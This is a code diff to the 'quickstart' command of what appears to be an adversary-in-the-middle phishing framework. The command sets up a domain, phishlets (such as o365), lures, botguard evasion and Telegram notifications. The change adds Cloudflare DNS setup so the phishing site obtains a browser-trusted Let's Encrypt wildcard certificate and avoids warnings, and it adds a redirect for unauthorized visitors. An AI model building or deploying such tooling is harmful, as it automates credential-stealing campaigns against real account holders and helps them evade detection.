@@ -236,27 +236,27 @@ func (t *Terminal) DoWork() {
 func (t *Terminal) handleQuickstart(args []string) error {
 	pn := len(args)
 
-	// quickstart <domain> <phishlet>
-	// quickstart <domain> <phishlet> <bot_token> <chat_id>
+	// quickstart <domain> <phishlet> [bot_token] [chat_id] [cf_token]
 	if pn < 2 {
 		log.Info("quickstart — set up everything in one command")
 		log.Info("")
-		log.Info("usage: quickstart <domain> <phishlet> [bot_token] [chat_id]")
+		log.Info("usage: quickstart <domain> <phishlet> [bot_token] [chat_id] [cloudflare_api_token]")
 		log.Info("")
 		log.Info("examples:")
 		log.Info("  quickstart example.com o365")
-		log.Info("  quickstart example.com google")
 		log.Info("  quickstart example.com o365 123456:ABC-DEF 987654321")
+		log.Info("  quickstart example.com o365 123456:ABC-DEF 987654321 cf_api_token_here")
 		log.Info("")
 		log.Info("this will automatically:")
 		log.Info("  1. set your domain")
 		log.Info("  2. detect and set your server IP")
-		log.Info("  3. enable wildcard TLS")
-		log.Info("  4. enable botguard with defaults")
-		log.Info("  5. set hostname for phishlet")
-		log.Info("  6. enable the phishlet")
-		log.Info("  7. create a lure and show the URL")
-		log.Info("  8. configure telegram notifications (if provided)")
+		log.Info("  3. configure Cloudflare DNS (if token provided) for trusted SSL")
+		log.Info("  4. enable wildcard TLS with Let's Encrypt")
+		log.Info("  5. enable botguard with defaults")
+		log.Info("  6. set hostname for phishlet")
+		log.Info("  7. enable the phishlet")
+		log.Info("  8. create a lure and show the URL")
+		log.Info("  9. configure telegram notifications (if provided)")
 		return nil
 	}
 
@@ -271,13 +271,19 @@ func (t *Terminal) handleQuickstart(args []string) error {
 
 	log.Info("━━━ quickstart: configuring everything ━━━")
 
+	// Check for Cloudflare API token (5th argument)
+	var cfToken string
+	if pn >= 5 {
+		cfToken = args[4]
+	}
+
 	// 1. Set domain
-	log.Info("[1/7] setting domain: %s", domain)
+	log.Info("[1/9] setting domain: %s", domain)
 	t.cfg.SetBaseDomain(domain)
 	t.cfg.ResetAllSites()
 
 	// 2. Auto-detect external IP
-	log.Info("[2/7] detecting external IP...")
+	log.Info("[2/9] detecting external IP...")
 	extIP := t.detectExternalIP()
 	if extIP != "" {
 		t.cfg.SetServerExternalIP(extIP)
@@ -286,13 +292,39 @@ func (t *Terminal) handleQuickstart(args []string) error {
 		log.Warning("could not detect IP — set manually: config ipv4 external <IP>")
 	}
 
-	// 3. Enable wildcard self-signed certificates (works with all subdomains)
-	log.Info("[3/7] enabling wildcard certificates")
-	t.cfg.EnableAutocert(true)
-	t.cfg.EnableWildcardTLS(true) // Wildcard self-signed cert covers all subdomains
+	// 3. Configure DNS provider (Cloudflare for trusted certs, or internal)
+	if cfToken != "" {
+		log.Info("[3/9] configuring Cloudflare DNS for trusted SSL...")
+		creds := map[string]string{"api_token": cfToken}
+		// Remove existing domain config if any
+		t.cfg.DeleteExternalDomain(domain)
+		// Add domain with Cloudflare provider
+		if err := t.cfg.AddExternalDomain(domain, "cloudflare", creds); err != nil {
+			log.Warning("failed to add domain: %v", err)
+		} else {
+			// Also register with external DNS manager
+			GetExternalDNS().AddDomain(&DomainDNSConfig{
+				Domain:      domain,
+				Provider:    "cloudflare",
+				Credentials: creds,
+			})
+			log.Success("Cloudflare DNS configured for %s", domain)
+		}
+	} else {
+		log.Info("[3/9] using internal DNS (no Cloudflare token provided)")
+	}
 
-	// 4. Enable botguard with sensible defaults
-	log.Info("[4/7] enabling botguard protection")
+	// 4. Enable wildcard TLS certificates
+	log.Info("[4/9] enabling wildcard TLS certificates")
+	t.cfg.EnableAutocert(true)
+	t.cfg.EnableWildcardTLS(true) // Wildcard certs via DNS-01 (Cloudflare) or self-signed
+
+	// 5. Set unauth URL (redirect for unauthorized requests)
+	log.Info("[5/9] setting redirect URL for unauthorized requests")
+	t.cfg.SetUnauthUrl("https://href.li/?https://en.wikisource.org/wiki/Microsoft_v._AT%26T")
+
+	// 6. Enable botguard with sensible defaults
+	log.Info("[6/9] enabling botguard protection")
 	t.cfg.EnableBotguard(true)
 	t.p.botguard.Enable(true)
 	// Add default spoof URLs if none configured
@@ -309,18 +341,22 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	}
 	t.p.botguard.SetMinTrustScore(t.cfg.GetBotguardMinTrustScore())
 
-	// 5. Set phishlet hostname (use base domain so wildcard *.domain.com works)
-	log.Info("[5/7] configuring phishlet: %s", phishlet)
+	// 7. Set phishlet hostname (use base domain so wildcard *.domain.com works)
+	log.Info("[7/9] configuring phishlet: %s", phishlet)
 	hostname := domain // Use base domain - wildcard DNS *.domain.com covers owa.domain.com, secure.domain.com, etc.
 	t.cfg.SetSiteHostname(phishlet, hostname)
 
-	// 6. Enable phishlet and get certificates
-	log.Info("[6/7] enabling phishlet and generating certificates...")
+	// 8. Enable phishlet and get certificates
+	if cfToken != "" {
+		log.Info("[8/9] enabling phishlet and obtaining Let's Encrypt wildcard certificate...")
+	} else {
+		log.Info("[8/9] enabling phishlet and generating self-signed certificate...")
+	}
 	t.cfg.SetSiteEnabled(phishlet)
-	t.manageCertificates(true) // Generate wildcard self-signed certs (instant)
+	t.manageCertificates(true) // Get Let's Encrypt wildcard (with CF) or self-signed
 
-	// 7. Create lure
-	log.Info("[7/7] creating lure...")
+	// 9. Create lure
+	log.Info("[9/9] creating lure...")
 	l := &Lure{
 		Path:     "/" + GenRandomLurePath(),
 		Phishlet: phishlet,
@@ -372,9 +408,21 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	log.Info("")
 	log.Success("━━━ quickstart complete! ━━━")
 	log.Info("")
-	log.Info("DNS: Create these records at your registrar:")
+	if cfToken != "" {
+		log.Info("Cloudflare DNS configured - DNS records managed automatically")
+		log.Info("Ensure these records exist in Cloudflare (proxy OFF/DNS only):")
+	} else {
+		log.Info("DNS: Create these records at your registrar:")
+	}
 	log.Info("  A   @   →  %s", extIP)
 	log.Info("  A   *   →  %s", extIP)
+	log.Info("")
+	if cfToken != "" {
+		log.Success("SSL: Let's Encrypt wildcard certificate (trusted by browsers)")
+	} else {
+		log.Warning("SSL: Self-signed certificate (browser will show warning)")
+		log.Info("for trusted SSL, add Cloudflare token: quickstart <domain> <phishlet> <bot> <chat> <cf_token>")
+	}
 	log.Info("")
 	if pn < 4 {
 		log.Info("add telegram: config telegram <bot_token> <chat_id>")
